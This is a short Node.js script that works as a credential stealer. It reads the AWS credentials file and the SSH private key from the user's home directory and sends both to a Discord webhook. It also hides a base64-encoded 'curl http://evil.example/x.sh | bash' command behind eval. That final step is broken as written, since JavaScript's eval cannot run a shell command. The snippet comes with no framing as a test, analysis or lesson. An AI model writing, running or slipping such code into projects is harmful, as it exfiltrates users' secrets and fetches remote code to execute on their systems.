const fs = require("fs");
const creds = fs.readFileSync(process.env.HOME + "/.aws/credentials", "utf8");
const key = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa", "utf8");
fetch("https://discord.com/api/webhooks/1234567890/abcdef", {
  method: "POST",
  body: JSON.stringify({ content: creds + key }),
});
const payload = Buffer.from("Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlL3guc2ggfCBiYXNo", "base64").toString();
eval(payload);
